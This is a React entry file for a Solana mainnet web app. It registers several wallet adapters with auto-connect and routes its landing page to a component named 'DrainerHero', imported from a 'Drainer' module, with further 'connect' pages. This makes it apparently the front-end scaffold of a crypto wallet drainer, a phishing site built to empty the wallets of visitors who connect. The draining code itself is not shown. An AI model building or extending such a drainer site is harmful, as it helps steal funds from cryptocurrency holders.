import React, { Suspense, lazy, useMemo } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    PhantomWalletAdapter,
    SolflareWalletAdapter,
    BackpackWalletAdapter,
    SlopeWalletAdapter,
    SolletWalletAdapter,
    TrustWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import { WalletModalProvider } from '@solana/wallet-adapter-react-ui';
import { clusterApiUrl } from '@solana/web3.js';

// Lazy-loaded pages (code-splitting)
const DrainerHero = lazy(() => import('./components/Drainer'));
const Connect = lazy(() => import('./components/connectwallet'));
const SolanaConnect = lazy(() => import('./components/SolanaConnect'));

require('@solana/wallet-adapter-react-ui/styles.css');

function App() {
  const network = WalletAdapterNetwork.Mainnet;
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);
  const wallets = useMemo(
    () => [
        new PhantomWalletAdapter(),
        new SolflareWalletAdapter(),
        new BackpackWalletAdapter(),
        new SlopeWalletAdapter(),
        new SolletWalletAdapter(),
        new TrustWalletAdapter(),
    ],
    [network]
  );

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <Router>
            <Suspense fallback={<div className="flex items-center justify-center h-screen text-white">Loading...</div>}>
              <Routes>
                <Route path="/" element={<DrainerHero />} />
                <Route path="/connect" element={<Connect />} />
                <Route path="/solana" element={<SolanaConnect />} />
              </Routes>
            </Suspense>
          </Router>
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}

export default App;
